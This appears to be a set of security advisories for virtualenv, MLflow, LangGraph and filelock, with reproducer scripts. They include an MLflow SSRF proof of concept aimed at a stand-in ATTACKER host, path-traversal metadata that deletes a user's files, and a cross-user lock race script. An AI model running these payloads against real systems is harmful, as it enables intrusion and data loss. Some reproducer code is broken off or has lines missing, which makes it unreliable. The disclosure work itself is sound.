assert not marker.exists(), "creating the environment must not run the prompt"

# user: in an interactive bash, source bin/activate, then start sh.
# -i makes both shells draw their prompt although stdin is not a terminal; sh draws one, reads EOF and returns
session = Path("/tmp/repro.d/user_session.sh").read_text()
interactive_bash = ["bash", "--norc", "--noprofile", "-i"]

# control: PS1 set in bash but not exported, so sh does not inherit it
control = subprocess.run(interactive_bash, input="PS1='\\$ '\n" + session,
                         stderr=subprocess.PIPE, text=True, check=True)
print(control.stderr)
ran_in_control = marker.exists()
print("CONTROL  PS1 not exported: marker created:", ran_in_control)

# attack: the same session with the one difference that PS1 is exported
attack = subprocess.run(interactive_bash, input="export PS1='\\$ '\n" + session,
                        stderr=subprocess.PIPE, text=True, check=True)
print(attack.stderr)
ran_in_attack = marker.exists()
print("OBSERVED PS1 exported:     marker created:", ran_in_attack)

# check: the prompt text must be drawn, never run, by every shell that draws it
print("BUG" if ran_in_attack and not ran_in_control else "OK")

repro.d/user_session.sh

. /tmp/repro-inherited-ps1/env/bin/activate
sh -i </dev/null

Impact

An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script precedent in GHSA-p58f-9548-mpm2. The attack requires control of argument data and subsequent user activation; it does not require replacing an executable or controlling app-data contents.

Versions tested

The supplied follow-up review marks command execution as independently confirmed by its author. The implementation review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.

Known mitigation

Use trusted prompt and destination values. On older releases, disable the environment prompt with VIRTUAL_ENV_DISABLE_PROMPT=1. Recreate environments with virtualenv 21.14.9 or later.

Affected release

  • The problem reproduces on virtualenv 21.14.8.

Credits

The original report was supplied by Anthropic's OSS Scanner as ANT-2026-1MOI2X3T. The subsequent maintainer-provided review identified the remaining activation path.

References

  • https://github.com/pypa/virtualenv/security/advisories/GHSA-6w3r-xr62-4xcp

entry.title: [virtualenv] virtualenv: Venv configuration readback can reinterpret path boundaries
entry.content:
Summary

The venv creator reads the standard library's generated pyvenv.cfg with splitlines() and merges all resulting keys over virtualenv's configuration. Line-boundary characters from destination data can therefore become configuration structure before output sanitization.

Anthropic's OSS Scanner reported this as ANT-2026-6ZQHJ6VI in virtualenv-20261015-005, received on 15 October 2026.

Affected area

Configuration readback by the stdlib venv creator.

Attacker-controlled input

An untrusted caller must influence the destination pathname passed to the venv creator. That pathname must contain a character that Python treats as a line boundary. The builtin creator follows a different configuration-writing path.

Affected code

The relevant 21.14.8 source is in venv readback, configuration parser.

Mechanism

With --creator venv, virtualenv asks the standard library to create an environment, reads its pyvenv.cfg with str.splitlines(), and merges the parsed keys over virtualenv's chosen settings. CPython writes the destination into a command = value without escaping every character that splitlines() recognizes as a line boundary. A destination containing U+2028, for example, can therefore supply new home and include-system-site-packages keys during readback. Virtualenv writes those keys as real configuration lines. The builtin creator does not use this readback path.

Reproduction and evidence

The scanner used one destination value with U+2028 between home = /attacker/chosen, include-system-site-packages = true, and an absorbing x = key. A python -m venv --without-pip control kept the value inside its command line and reported the base interpreter's sys._home. virtualenv --creator venv --no-seed on the same value wrote separate injected configuration lines and its interpreter reported sys._home = /attacker/chosen. The path did not require a literal newline byte. The control establishes that the extra keys came from virtualenv's readback, not from the standard library's initial file alone.

The altered home can change which standard-library files the interpreter loads if an attacker also controls that location; include-system-site-packages = true weakens environment isolation. Choosing the venv creator is required, either explicitly or through a rare fallback. The report traces the readback to the 20.x rewrite, first released in 20.0.0b1. PR #3426 rejects line-boundary characters before creation and rebuilds the final configuration from selected settings.

Attack sequence

sequenceDiagram
    participant A as Destination supplier
    participant S as stdlib venv
    participant V as virtualenv readback
    participant C as Final pyvenv.cfg
    participant P as Environment Python
    A->>S: path contains U+2028 and home = /attacker/chosen
    S->>C: write path inside command value
    V->>C: read with splitlines()
    V->>V: parse suffix as separate keys
    V->>C: rewrite home and include-system-site-packages
    P->>C: read injected keys on startup
    C-->>P: sys._home changes and isolation is disabled

Reproducer files

The following files are from the scanner report for ANT-2026-6ZQHJ6VI. They were tested against commit a857a7823c73 in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDs need a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.

repro

#!/usr/bin/env python3
import os
import shutil
import subprocess

work = "/tmp/repro-venv-creator-cfg"
shutil.rmtree(work, ignore_errors=True)

# the attacker's input: the text of a destination path.
# U+2028 ends a line for str.splitlines() but not for CPython's own pyvenv.cfg reader.
# The slashes only make nested directories; the last key, x, absorbs the rest of the path.
LS = "\u2028"
dest = f"{work}/proj{LS}home = /attacker/chosen{LS}include-system-site-packages = true{LS}x = /env"

base_python = os.path.realpath(shutil.which("python"))
real_home = os.path.dirname(base_python)


def pyvenv_cfg_lines(env):
    # split on "\n" only, as the interpreter does
    return open(f"{env}/pyvenv.cfg", encoding="utf-8").read().split("\n")


def sys_home(env):
    # site.py sets sys._home from the `home` key of the environment's pyvenv.cfg
    probe = [f"{env}/bin/python", "-c", "import sys; print(sys._home)"]
    return subprocess.run(probe, capture_output=True, text=True, check=True).stdout.strip()


# control: the same path through the standard library alone
stdlib_env = dest + "-stdlib"
subprocess.run([base_python, "-m", "venv", "--without-pip", stdlib_env], check=True)

# attack: the same path through virtualenv; --creator venv is the one non-default option
virtualenv_env = dest + "-virtualenv"
created = subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--no-seed", "--creator", "venv", virtualenv_env])
if created.returncode != 0:  # refusing such a destination is a valid fix
    print("virtualenv refused the destination")
    print("OK")
    raise SystemExit

# check
stdlib_cfg, stdlib_home = pyvenv_cfg_lines(stdlib_env), sys_home(stdlib_env)
virtualenv_cfg, virtualenv_home = pyvenv_cfg_lines(virtualenv_env), sys_home(virtualenv_env)

print("CONTROL  python -m venv wrote pyvenv.cfg:")
for line in stdlib_cfg:
    print("    " + ascii(line))
print(f"CONTROL  python -m venv: sys._home = {stdlib_home}")
print("OBSERVED virtualenv --creator venv wrote pyvenv.cfg:")
for line in virtualenv_cfg:
    print("    " + ascii(line))
print(f"OBSERVED virtualenv --creator venv: sys._home = {virtualenv_home}")

keys_injected = "home = /attacker/chosen" in virtualenv_cfg and "include-system-site-packages = true" in virtualenv_cfg
print("BUG" if stdlib_home == real_home and keys_injected and virtualenv_home == "/attacker/chosen" else "OK")

Impact

Destination path data can change configuration boundaries and therefore environment settings. The effect depends on which settings change and how the environment is subsequently used.

Severity: low.

Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected version or exclude earlier releases. Fixed in 21.14.9.

The fix rejects line boundaries in the supplied destination before filesystem access and checks the resolved path again before invoking stdlib venv. The final configuration is rebuilt from the selected interpreter and virtualenv options, without merging the intermediate stdlib file or its vendor-specific keys. Ordinary destination paths remain supported.

Fix: PR #3426.

Known mitigation

Reject line-boundary characters in externally supplied destination paths, or use the builtin creator where supported.

Affected release

  • The problem reproduces on virtualenv 21.14.8.

Credits

Reported by Anthropic's OSS Scanner as ANT-2026-6ZQHJ6VI.

References

  • https://github.com/pypa/virtualenv/security/advisories/GHSA-qmx5-4p3x-wvqf
  • https://nvd.nist.gov/vuln/detail/CVE-2026-113715
  • https://github.com/pypa/virtualenv/pull/3426
  • https://github.com/pypa/virtualenv/commit/b0008a58885ded9227faf8f910c6c402712c750a
  • https://github.com/pypa/virtualenv/releases/tag/21.14.9
  • https://github.com/advisories/GHSA-qmx5-4p3x-wvqf

entry.title: [virtualenv] virtualenv: Seed replacement does not contain metadata deletion paths
entry.content:
Summary

The app-data seeder joins paths from existing distribution metadata to site-packages and deletes the resulting paths without checking containment within the environment.

Anthropic's OSS Scanner reported this as ANT-2026-SXOEHWP7 in virtualenv-20261015-005, received on 15 October 2026.

Affected area

Removal of a previously installed seed package.

Attacker-controlled input

An environment being reused must contain distribution metadata influenced by another account. The invoking user must have deletion rights over the paths named by that metadata. Installing a new environment without existing package metadata does not enter this cleanup path.

Affected code

The relevant 21.14.8 source is in seed uninstall.

Mechanism

Before reinstalling a seed wheel, PipInstall._uninstall_previous_version() accepts an existing pip-*.dist-info directory in the destination. _uninstall_dist() reads its top_level.txt and RECORD, joins each entry to site-packages, and deletes the result. It does not check whether .., an absolute entry, or a linked parent takes the path outside the environment. The default app-data seeder reaches this path when it reuses a tree containing seed-package metadata; --clear removes that tree first.

Reproduction and evidence

The scanner prepared a project with .venv/lib/python3.14/site-packages/pip-1.0.dist-info/. Its top_level.txt contained ../../../../../Documents; its RECORD named ../../../../../notes.txt,,. The user's home initially held Documents/thesis/chapter1.txt and notes.txt. Running virtualenv .venv exited successfully but removed both paths. A control tree with top_level.txt set to pip and a normal pip/__init__.py RECORD entry left the home files in place. The reproducer prints BUG only when the control files survive and both attack targets disappear.

The deletion uses the invoking user's permissions and runs during creation, before any use of the environment. It requires an existing destination that another account could populate; a fresh empty environment does not supply hostile metadata. The report traces this cleanup to #2186, first released in 20.8.1. PR #3428 checks each deletion path against the resolved environment root and refuses to delete the root itself.

Attack sequence

sequenceDiagram
    participant A as Prepared .venv metadata
    participant V as App-data seeder
    participant P as site-packages
    participant H as User home
    A->>P: top_level.txt names ../../../../../Documents
    A->>P: RECORD names ../../../../../notes.txt
    V->>P: read pip-1.0.dist-info before reinstall
    P->>H: join entries without containment check
    V->>H: remove Documents and notes.txt
    V-->>A: virtualenv exits successfully

Reproducer files

The following files are from the scanner report for ANT-2026-SXOEHWP7. They were tested against commit a857a7823c73 in the scanner image. The repro entrypoint expects companion files under /tmp/repro.d; cases that change user IDs need a disposable root-capable container. The last output line is BUG when the reported behavior occurs. These files are included as evidence and were not rerun for this advisory update.

repro

#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
from pathlib import Path

work = Path("/tmp/repro-seed-uninstall")
shutil.rmtree(work, ignore_errors=True)
USER_FILES = ("Documents/thesis/chapter1.txt", "notes.txt")


def make_home(name):
    home = work / name
    (home / "Documents" / "thesis").mkdir(parents=True)
    (home / "Documents" / "thesis" / "chapter1.txt").write_text("months of work\n")
    (home / "notes.txt").write_text("my notes\n")
    return home


def unpack_attacker_project(home, top_level_line, record_line):
    subprocess.run(
        [sys.executable, "/tmp/repro.d/make_project_tree.py", home / "project", top_level_line, record_line],
        check=True,
    )

entry.title: [mlflow] MLflow: SSRF on unauthenticated MLflow servers via third-party scorer kwargs in the scorer invoke, register, and GenAI evaluate endpoints
entry.content:
Summary

MLflow's tracking server exposes POST /ajax-api/3.0/mlflow/scorer/invoke with no authentication, and the handler reflectively instantiates an attacker-named class from attacker-supplied JSON with unconstrained constructor kwargs. With the optional trulens + trulens-providers-litellm packages installed, an unauthenticated attacker can force the server to make an outbound HTTP request to an arbitrary host of their choosing, carrying attacker-controlled headers (SSRF).

Details

Scorer.model_validate_json() reflects a class name from a JSON payload behind an import-path allowlist that never constrains the reflected attribute or its kwargs, in mlflow/genai/scorers/base.py:549-604:

data = serialized.third_party_scorer_data          # attacker JSON
module_path = data.get("module") or ""
class_name = data.get("class")
if not any(module_path == m or module_path.startswith(m + ".")
           for m in THIRD_PARTY_SCORER_ALLOWED_MODULES):
    raise MlflowException.invalid_parameter_value(...)
module = importlib.import_module(module_path)
scorer_class = getattr(module, class_name, None)   # attribute NOT constrained
...
init_kwargs: dict[str, Any] = dict(data.get("kwargs") or {})  # kwargs NOT constrained
...
init_kwargs["model"] = data["model"]               # attacker model URI
scorer_instance = scorer_class(**init_kwargs)      # reflective instantiation

The allowlist (mlflow/genai/scorers/scorer_utils.py:46-51) only gates the import path:

THIRD_PARTY_SCORER_ALLOWED_MODULES = frozenset({
    "mlflow.genai.scorers.ragas",
    "mlflow.genai.scorers.deepeval",
    "mlflow.genai.scorers.trulens",
    "mlflow.genai.scorers.phoenix",
})

For a mlflow.genai.scorers.trulens class, the forwarded model/kwargs reach an outbound LLM client through a routing choice the attacker controls (mlflow/genai/scorers/trulens/models.py:97-121):

backend = ScorerLLMClient(model_uri)
if backend.route == "databricks":
    return _create_databricks_provider(backend, **kwargs)
if backend.is_native:
    return _create_gateway_provider(backend, **kwargs)
try:
    from trulens.providers.litellm import LiteLLM
    litellm_model = backend.model_name
    ...
    return LiteLLM(model_engine=litellm_model, **kwargs)   # raw attacker kwargs forwarded

Only the litellm fallback branch reaches raw **kwargs; a model URI outside MLflow's native provider registry (e.g. openai:/gpt-4o) trivially routes there, and LiteLLM.__init__ forwards api_base/api_key straight into litellm.completion().

  • Route: POST /ajax-api/3.0/mlflow/scorer/invoke → _invoke_scorer_handler (mlflow/server/handlers.py:7026-7098), guarded only by @catch_mlflow_exception/@_disable_if_artifacts_only — no auth decorator.
  • Scorer.model_validate_json(serialized_scorer) (the vulnerable deserialization) runs synchronously, before any tracking-store lookup or submit_job call.
  • Precondition: the server venv must have trulens + trulens-providers-litellm installed (a documented but optional, not-bundled GenAI-eval setup).

PoC

import time
import mlflow
from mlflow import MlflowClient
import requests

TARGET = "http://TARGET:5000"           # MLflow tracking server, no auth configured
ATTACKER = "http://ATTACKER/collect"    # host the attacker controls and monitors

client = MlflowClient(tracking_uri=TARGET)

# 1. Anonymous setup: create an experiment and log a trace to obtain a trace_id.
exp_id = client.create_experiment("poc")
mlflow.set_tracking_uri(TARGET)
mlflow.set_experiment(experiment_id=exp_id)
with mlflow.start_span(name="poc-span") as span:
    span.set_inputs({"q": "hi"})
    span.set_outputs({"a": "hi"})
trace_id = span.request_id

# 2. Attack: invoke a reflected trulens scorer whose kwargs point the
#    outbound LLM client at the attacker host with an attacker-chosen
#    Authorization value (their own canary, not a server secret).
serialized_scorer = {
    "name": "poc",
    "third_party_scorer_data": {
        "module": "mlflow.genai.scorers.trulens",
        "class": "Coherence",
        "metric_name": "Coherence",
        "model": "openai:/gpt-4o",          # routes to the litellm fallback
        "kwargs": {
            "api_base": ATTACKER,
            "api_key": "ATTACKER-CANARY",   # attacker's own value, not a server secret
        },
    },
}
resp = requests.post(
    f"{TARGET}/ajax-api/3.0/mlflow/scorer/invoke",
    json={
        "experiment_id": exp_id,
        "serialized_scorer": __import__("json").dumps(serialized_scorer),
        "trace_ids": [trace_id],
    },
)
print(resp.status_code, resp.text)
time.sleep(5)  # scorer job runs asynchronously

# Attacker-controlled listener at ATTACKER receives, moments later:
POST /collect/chat/completions HTTP/1.1
Authorization: Bearer ATTACKER-CANARY
Content-Type: application/json
...

The POST .../chat/completions request landing on ATTACKER, carrying the attacker's own Authorization header, is the server-originated outbound request — no request was ever sent by the client to that host directly.

Impact

An unauthenticated attacker forces the tracking server to issue an outbound HTTP request to an arbitrary attacker-chosen host — reachable from the server's network position, including internal services or cloud-metadata endpoints — with fully attacker-controlled request headers and body. This is SSRF with header/credential injection into the server-originated request; it requires no prior authentication and no operator misconfiguration beyond having the optional trulens + trulens-providers-litellm packages installed alongside MLflow.

entry.title: [langgraph-checkpoint-sqlite] LangGraph: Namespace labels containing `.` reach other namespaces in Postgres and SQLite stores
entry.content:
Summary

The Postgres and SQLite stores save a namespace as its labels joined with ., so ("tenant", "bob") and ("tenant.bob",) map to the same stored namespace. put rejected labels containing ., but get, search, delete, list_namespaces, their async versions, and ops passed directly to batch/abatch did not. A caller that could pass such a label could read, overwrite or delete items in another namespace.

Details

BaseStore checked namespace labels only in put/aput. The other methods passed the namespace on unchecked, and batch/abatch checked nothing, including the PutOp items inside them. PostgresStore, AsyncPostgresStore, SqliteStore and AsyncSqliteStore turn a namespace into text with ".".join(namespace), so a label containing . resolved to the namespace whose labels it spells out:

  • get(("tenant.bob",), key), search(("tenant.bob",)) and list_namespaces(prefix=("tenant.bob",)) returned data stored under ("tenant", "bob").
  • delete(("tenant.alice",), key) deleted the item stored under ("tenant", "alice").
  • batch([PutOp(("tenant.bob",), key, value)]) overwrote the item stored under ("tenant", "bob").

All releases of langgraph-checkpoint-postgres before 3.1.3 and langgraph-checkpoint-sqlite before 3.1.2 are affected. InMemoryStore compares namespaces as tuples and is not affected.

Impact

You may be affected if you use one of these stores, rely on namespaces to keep users or tenants apart, and let untrusted input choose a namespace label that reaches a read, delete or batch call. Such input could read, overwrite or delete another tenant's items. Labels written through put could never contain ., so no stored data becomes unreachable after upgrading.

LangSmith Deployment: the HTTP store API already rejected such labels, but store calls made from graph code reached the same flaw. The Agent Server rejects these labels from versions 0.15.5 and 0.16.2. On LangSmith Cloud, new deployments and revisions already include the fix and existing deployments get it on their next revision; self-hosted deployments should upgrade.

Remediation

Upgrade to langgraph-checkpoint-postgres 3.1.3 or langgraph-checkpoint-sqlite 3.1.2. Both require langgraph-checkpoint 4.3.0, where get, search, delete and list_namespaces reject labels that are empty, are not strings, or contain . with InvalidNamespaceError, and the Postgres and SQLite stores apply the same check to every op passed to batch/abatch. Stores outside this repository that turn namespaces into delimited text can call langgraph.store.base.validate_op_namespace for each op they run.

References

  • https://github.com/langchain-ai/langgraph/security/advisories/GHSA-6hmw-9432-67qq
  • https://github.com/langchain-ai/langgraph/pull/9217
  • https://github.com/langchain-ai/langgraph/commit/bfcfea554ed5c7f7be562cebf8825e911b493ab1
  • https://github.com/langchain-ai/langgraph/releases/tag/checkpointpostgres%3D%3D3.1.3

entry.title: [filelock] filelock: SoftFileLock evicts a fresh lock file whose watched age another local user's pre-dated file passed on through inode reuse
entry.content:
SoftFileLock and MarkerSoftFileLock evict an unparsable marker (the lock file at <path>, whose presence says a process holds the lock) once a waiting contender has watched it unchanged for two seconds. SoftFileLease expires a lease the same way. The watch tells two looks apart by the marker's modification time (mtime) and inode number (the kernel's identity for a file, independent of its name) alone.

Another local user (the other user below) who can create files in the lock's directory, a sticky /tmp included (the sticky bit is a directory flag that lets only a file's owner remove it), parks an empty file of its own at the lock path. It dates that file to a future tick of the kernel's coarse clock (a clock that advances in steps of 4 ms), lets the waiters of the user running the lock (the lock user below) watch it past two seconds, and unlinks it in that tick. On a filesystem that hands a freed inode number straight back (ext4, overlayfs on ext4) the lock user's next marker repeats both values. It inherits the time spent watching the other user's file, and a second waiter removes it while its owner holds the lock.

Two of the lock user's processes then run the critical section together with no error. A SoftFileLease waiter takes a live lease that its owner wrote moments before, within milliseconds instead of after lease_duration. Affected versions: filelock >= 4.1.0 and <= 4.2.0 (finding ANT-2026-RKC48J5B).

Severity

CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N, 4.7 (Medium).

AV:L (local): the other user needs an account on the same host. AC:H (high attack complexity): a race the other user cannot steer. It needs ext4-style inode reuse, a coarse-clock timestamp tick the other user can predict, and two polls of the lock user inside a 4 ms tick and a ~75 µs create-to-write gap. The scanner measured 2 to 10 % of attempts; none of our own 250 attempts fired. PR:L (low privileges): an unprivileged account is enough. UI:N (no user interaction): the lock user's processes act on their own. C:N (no confidentiality impact): the other user reads nothing. I:H (high integrity impact): two holders write the data the lock protects, and neither learns of the other. A:N (no availability impact): the lock keeps working.

Classification from the review: security, conditional, by mechanism. It is the same cross-UID primitive (a UID is a user account's numeric id) as the stale-break inode-reuse race reported in a separate advisory: an inode number reused after the other user's unlink in a sticky directory, which our review reproduced across UIDs, plus a forged future mtime. The scanner rated it high (CWE-694) and demonstrated it across UIDs in its own runs. It did not fire in 250 attempts of ours over ext4 with inode reuse confirmed, nor in the scanner-side triage, so its cross-user claim rests on the report's own runs and on the mechanism.

Scope and preconditions

  • The other user can create files in the lock's directory; a root-owned 1777 directory is enough. It creates, utimes (sets the timestamps of) and unlinks only its own file. In the sticky directory its unlink, rename, open(..., "w") and utime on a marker of the lock user all fail, and deleting its own file only frees the lock.
  • The directory is on a filesystem that reuses a freed inode number at once: ext4, and overlayfs on it (thousands of create/unlink cycles returned one number). tmpfs does not reuse one, so the pair cannot repeat there; btrfs does not either.
  • File timestamps come from a coarse clock whose future values the other user can compute (CLOCK_REALTIME_COARSE, 4 ms steps on Linux 6.1; 20,000 file creations all carried that clock's value).
  • At least two processes of the lock user are waiting on the lock while the other user's file is there. The other user does not choose which processes overlap or when; each attempt blocks the lock for 2.2 s (for a lease, lease_duration).
  • No symbolic link, hard link or FIFO takes part, so the fs.protected_* sysctls (Linux settings that restrict following links and opening pipes in sticky world-writable directories) play no part. StrictSoftFileLock keys its watch the same way but only raises SoftFileLockProtocolError, so it breaks no lock there.

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

Affected code

At the scanned commit b831496, the watch is SoftFileLock._marker_unchanged_for, with its caller in _try_break_stale_lock. The MarkerSoftFileLock and SoftFileLease paths hand an unparsable marker to the same code. The re-check in break_lock_file compares the values the contender just read.

Introduced

0f7c4d3794dc ("fix(soft): expire leases on the contender's clock", #796, 2026-10-07), first released in 4.1.0 (verified against the tags). Earlier releases compared the marker's mtime with the wall clock, and this does not affect them.

Mechanism

SoftFileLock._acquire creates the marker with O_CREAT | O_EXCL (create the file, fail if it exists) and only then writes the holder record. In between it calls fstat and uname, stats /proc/self/ns/pid and reads /proc/<pid>/stat, so for about 75 µs (measured) the marker exists and is empty. A contender that polls in that gap must not take the marker for garbage, and the check that protects it is the two-second watch. _try_break_stale_lock reads the marker, finds no holder, and calls break_lock_file(lock_file, mtime, ino) only if _marker_unchanged_for(mtime, ino) reaches MALFORMED_LOCK_AGE_THRESHOLD (2.0 s). That function keeps self._marker_seen = ((mtime, ino), first seen) across polls and returns the elapsed monotonic time (time from a clock that only moves forward) while the pair repeats.

Neither half of the pair belongs to one file. A file's owner sets its mtime to any value with utime, a future time included, and ext4 gives the inode number of an unlinked file to the next file created in the directory.

  1. While the lock is free, the other user creates an empty file at the lock path (inode I) and sets its mtime to T, a tick of the coarse clock about 2.2 s in the future.
  2. Every waiting process of the lock user polls each 50 ms, reads an empty file and records _marker_seen = ((T, I), first seen). After 2 s each poll calls break_lock_file, whose rename fails with EPERM (operation not permitted; seen with strace): the directory is sticky and the file belongs to the other user. suppress(OSError, ...) swallows the error, the file stays, and nothing resets _marker_seen.
  3. When the coarse clock reaches T, the other user unlinks its file. Inode I is free.
  4. Process F of the lock user polls during tick T. Its O_EXCL create succeeds, and its marker is inode I with mtime T.
  5. Process S polls before F has written its record. It reads an empty file with pair (T, I), _marker_unchanged_for returns the 2.2 s that S spent watching the other user's file, and S calls break_lock_file(lock_file, T, I).
  6. break_lock_file compares mtime and inode before and after its rename, but with the values S just read from F's marker, so both checks pass. F's marker has S's UID, so the rename and the unlink succeed.
  7. F writes its record into the unlinked inode and returns from acquire(). The path is empty, so the next contender to poll creates a marker and returns from acquire() too. F's release finds another inode at the path (_unlink_open_marker) and leaves it. Neither holder learns anything.

Step 4 needs a poll inside one 4 ms tick, and step 5 a second poll inside F's 75 µs gap. Step 5 is far likelier than independent 50 ms timers would make it, because contenders that wait together bunch. With filelock's DEBUG messages timestamped, nine waiters polled within 2 to 3 ms of one another, several 0.1 ms apart or closer. In a run where the other user also recorded what replaced its file, 13 of 100 successors appeared in tick T, and a waiter broke 7 of those 13.

MarkerSoftFileLock and SoftFileLease hand an unparsable marker to the same code, and the lease uses the clock a second time, for expiry: if owner.mode == "lease" and self._marker_unchanged_for(mtime, ino) >= self._lease_duration: break_lock_file(...). _marker_seen is one attribute, so the same empty file primes this branch, and step 5 has no gap to hit. To every waiter, F's complete lease record with pair (T, I) has gone unrefreshed for lease_duration, until F's first heartbeat (the periodic refresh a lease holder runs). With the lock user's processes using SoftFileLease(path, lease_duration=2) and holding for 1 s, the same other user produced an overlap in 17 of 30 attempts. The superseded holder's on_compromise (the callback that tells a holder it lost the lock) reported owner-changed 0.67 s after it had entered, at its first heartbeat; a holder that releases before that is not told at all.

Reproduction

The scanner's reproducer for finding ANT-2026-RKC48J5B, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. The repro script drives the files under repro.d/.

repro

#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import time

LOCK_DIR = "/tmp/locks"
LOCK_PATH = "/tmp/locks/app.lock"
HOLDS_LOG = "/tmp/holds.log"


def start_victims():
    # a root-owned sticky directory like /tmp, and ten processes of user victim taking turns on one lock in it
    shutil.rmtree(LOCK_DIR, ignore_errors=True)
    os.mkdir(LOCK_DIR)
    os.chmod(LOCK_DIR, 0o1777)
    victim = [sys.executable, "/tmp/repro.d/victim.py", LOCK_PATH]
    with open(HOLDS_LOG, "w") as holds_log:
        return [
            subprocess.Popen(victim, stdout=holds_log, user="victim", group="victim", extra_groups=[])
            for _ in range(10)
        ]


def holds_entered_after(moment):
    holds = []
    for line in open(HOLDS_LOG):
        fields = dict(field.split("=") for field in line.split())
        hold = {"entered": float(fields["entered"]), "exited": float(fields["exited"]), "line": line.strip()}
        if hold["entered"] > moment:
            holds.append(hold)
    return sorted(holds, key=lambda hold: hold["entered"])


def attack_until_overlap(phase, date_offset_s, max_attempts):
    victims = start_victims()
    attacker = [sys.executable, "/tmp/repro.d/attacker.py", LOCK_PATH, str(date_offset_s)]
    for attempt in range(1, max_attempts + 1):
        run = subprocess.run(attacker, stdout=subprocess.PIPE, text=True, check=True,
                             user="attacker", group="attacker", extra_groups=[])
        print(f"{phase} attempt {attempt}: {run.stdout.strip()}", flush=True)
        unlinked_at = float(run.stdout.split("unlinked_at=")[1])
        time.sleep(0.4)  # a hold lasts 0.3 s: whoever entered after the unlink has logged it by now

        # A hold entered within 1 ms of the unlink can also come from a separate flaw in break_lock_file (see the
        # report), so those are left out. time.monotonic() is one clock for every process on the machine.
        holds = holds_entered_after(unlinked_at + 0.001)
        overlaps = [(first, second) for first, second in zip(holds, holds[1:])
                    if second["entered"] < first["exited"]]
        if overlaps:
            break
    for victim in victims:

import os
import random
import sys
import time

lock_path, date_offset_s = sys.argv[1], int(sys.argv[2])

CLOCK_REALTIME_COARSE = 5  # <linux/time.h>; the kernel stamps new files from it, and it moves once per timer tick

# take the lock path the moment it is free, like any contender

    try:

        break
    except FileExistsError:
        time.sleep(0.002)

# Left empty for longer than the 2 s filelock gives an unparsable marker. The victims poll every 50 ms: the random
# part makes some attempts free the path just before one of their polls.
park_s = random.uniform(2.2, 2.25)
release_tick = time.clock_gettime_ns(CLOCK_REALTIME_COARSE) + round(park_s * 1e9 / tick_ns) * tick_ns

unlinked_at = time.monotonic()
time.sleep(0.1)  # exiting right away keeps a CPU busy during the victims' polls, and overlaps get much rarer

Attack sequence

sequenceDiagram
    participant X as other local user
    participant P as lock path (sticky dir, ext4, 4 ms clock ticks)
    participant S as process S of the lock user (waiting)
    participant F as process F of the lock user
    X->>P: create empty file, inode I, utime to future tick T
    S->>P: poll: empty file, key (T, I), watch starts
    Note over S: after 2 s each poll calls break_lock_file, rename gets EPERM, error swallowed, watch keeps counting
    rect rgb(255, 214, 214)
        X->>P: at tick T: unlink own file, I is free
        F->>P: O_EXCL create in tick T: inode I, mtime T, record not yet written
        S->>P: poll: empty file, key (T, I) seen for 2.2 s: break_lock_file(T, I) renames and unlinks F's marker
        F->>P: writes record into the unlinked inode, acquire() returns
        Note over S,F: the path is empty, the next contender creates a marker: two holders, no error
    end

Evidence

The scanner's reproducer runs ten copies of a default-option SoftFileLock program (0.3 s of work per hold, 50 ms between holds) as user victim in a root-owned 1777 directory on overlayfs over ext4 (Linux 6.1, CPython 3.14). A program running as user attacker waits until the lock path is free, creates an empty file there, dates it to a coarse-clock tick 2.2 to 2.25 s ahead, and unlinks it when CLOCK_REALTIME_COARSE reaches that tick. Control attempts date the file an hour after the unlink tick (20 attempts, 0 overlaps); the other attempts date it at that tick.

In four runs the overlap came after 9, 12, 27 and 20 attempts. Each showed the hold lines of two victim processes overlapping in time with is_locked=True, for example pid=217 entered=241.295272609 exited=241.59542327 and pid=216 entered=241.295518489 exited=241.595641553. 40 of 650 attempts over seven runs ended this way, none with the file dated 4 ms earlier (100 attempts) or an hour later (150). A stepped run (one process stalled 0.2 s between creating its marker and writing its record, one waiting contender) deleted the fresh marker in 3 of 3 trials with the matching date and 0 of 5 with other dates.

Our review ran the reproducer over a loop-mounted ext4 /tmp (the host's btrfs does not hand a freed number back) with inode reuse confirmed (inode 18 reused on every attempt, --cpus 2). 0 of 250 attempts fired on 4.2.0 in 802 s, as in the scanner-side triage, and 0 of 250 on the head of #843, so our run gives no evidence either way. The review confirmed that utime cannot set the file's change time. The classification follows from the cross-UID inode-reuse primitive verified in the stale-break race of the separate advisory and from the report's own runs.

Impact

A local user who can create a file in a soft lock's directory, a sticky directory such as /tmp included, gets two processes of another user to hold the same SoftFileLock at once (MarkerSoftFileLock too, by the shared code). Neither process learns of the overlap, so both modify the data the lock protects. The other user has no simpler way to get this: in the sticky directory its unlink, rename, open(..., "w") and utime on a marker of the lock user all fail, and deleting its own file only frees the lock. For SoftFileLease the effect is a live, refreshed claim taken after milliseconds instead of after lease_duration without a refresh. The holder learns of it one heartbeat later, or not at all if it releases first. Not affected: releases before 4.1.0, filesystems that do not reuse inode numbers at once (tmpfs, btrfs), and a lock with a single contender.

Workarounds

Keep soft locks in a directory other users cannot create files in (a 0700 directory of the lock's user) rather than a shared sticky directory, or put the lock directory on tmpfs, which does not reuse inode numbers. Where the native FileLock works (local ext4 with flock), prefer it over SoftFileLock. Raise poll_interval so fewer waiters bunch inside one clock tick; this lowers the hit rate but does not close the window.
